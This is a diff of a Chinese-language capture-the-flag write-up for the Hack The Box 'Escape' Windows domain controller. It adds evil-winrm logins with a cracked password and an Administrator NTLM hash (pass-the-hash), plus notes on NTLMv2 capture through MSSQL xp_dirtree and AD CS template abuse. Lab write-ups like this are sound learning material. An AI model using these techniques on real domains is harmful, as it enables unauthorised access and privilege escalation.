@@ -2,6 +2,8 @@
 
 *Difficulty: Medium*
 
+第一次打Windows的靶机……也是边打边学了。
+
 ---
 
 ## 扫描
@@ -66,9 +68,11 @@ PORT      STATE         SERVICE
 
 ## 端口分析、攻击路径规划
 
-有Kerberos、LDAP感觉是个域控？
+有DNS、Kerberos、LDAP，应该是个域控？  
+域名疑似这个：sequel.htb0（后确认为“sequel.htb”）
 
-感觉可以参考这个[APT靶机](./HTB-APT.md)。先看看445和135有什么信息。
+感觉可以参考这个[APT靶机](./HTB-APT.md)。先看看445和135有什么信息。  
+然后有1433的SQL，打进去之后可能可以枚举LDAP？
 
 
 ## 445端口
@@ -82,28 +86,85 @@ PORT      STATE         SERVICE
 
 ## Initial Access
 
-### PoC (CVE-yyyy-xxxx)
+### 记住：获得有效凭据就尝试横向移动
+
+回顾了一下[APT靶机的过程](./HTB-APT.md#_3)，到底是怎么get shell的……
+
+### evil-winrm使用域凭据get shell
 
 
 ## flag: user
 
+```bash
+└─$ evil-winrm -i ${HTB_IP} -u Ryan.Cooper -p NuclearMosquito3
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
+sequel\ryan.cooper
 
 
-## 探索
-
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
+de9e……cb29
+```
 
 
 ## Privilege Escalation
 
-### PoC (CVE-yyyy-xxxx)
+### CA模板漏洞
 
 
 ## flag: root
 
+```
+└─$ evil-winrm -i ${HTB_IP} -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/4/2023   4:49 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+9384……db0c
+```
 
 ---
 
 ## 总结·后记
 
-YYYY/MM/DD
-……
+2023/06/04
+
+挺有意思的，这次该好好总结一下了。Certify之后都是跟着github照葫芦画瓢，要好好琢磨一下各个地方的知识点。
+
+首先是关于总体流程，RPC的优先度其实不该这么高。  
+SMB → MSSQL，捕获NTLMv2，由于是msf模块所以不太清楚具体细节，不过看手动也有用`xp_dirtree`强制NTLM认证的样子。  
+因为不熟悉MSSQL，进行了大量无意义的枚举。还总想着是否要登陆进去，结果登进去也没什么意义。早在hacktricks的最开头就写着关于获取Net-NTLM的信息了，不过因为想着不太可能破解NTLMv2所以就放置到最后才处理这步了。还是经验太少。
+
+破解后获得域凭据 → 由于是域凭据所以尝试初始连接，根据以前APT的笔记，有很多工具，不过这次都是使用`Evil-WinRM`。
+
+然后就是横向移动，感觉没什么技术含量，就略过吧。其实至今不明白为什么会想到组合err log里的两个username报错。是期待用户误操作将密码当用户名输入？
+
+最后的提权算是我印象中域渗透的精华部分了。首先自己该有枚举什么信息的思路，当思路走到`Certify`时，将会发现CA模板漏洞，这个也是前阵子接触到的一个概念。将是我接下来需要好好琢磨的地方。
